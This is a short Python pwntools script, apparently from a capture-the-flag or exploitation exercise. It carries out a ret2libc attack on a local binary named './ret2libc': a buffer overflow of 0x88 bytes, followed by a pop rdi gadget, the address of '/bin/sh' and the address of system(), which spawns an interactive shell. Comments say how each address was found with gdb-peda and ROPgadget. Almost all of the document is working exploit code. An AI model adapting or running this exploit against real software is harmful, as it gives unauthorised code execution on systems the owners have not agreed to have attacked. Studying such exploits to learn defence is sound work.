#!/usr/bin/env python3
# install python pwn tools package
from pwn import *

BIN = "./ret2libc"

context.binary = BIN


# gdb-peda$ p system
system_addr = 0x7ffff7e36e50

# gdb-peda$ find "/bin/sh"
binsh_addr = 0x7ffff7f78152

# Use peda, or  ropper, ROPgadget etc.
poprdi = 0x0040120b

# static analysis or pattc+patto from peda
ret_offset = 0x80 + 8

payload = b""
payload += ret_offset * b"A"
payload += pack(poprdi)
payload += pack(binsh_addr)
payload += pack(system_addr)

io = process(BIN)
io.send(payload)
io.interactive()
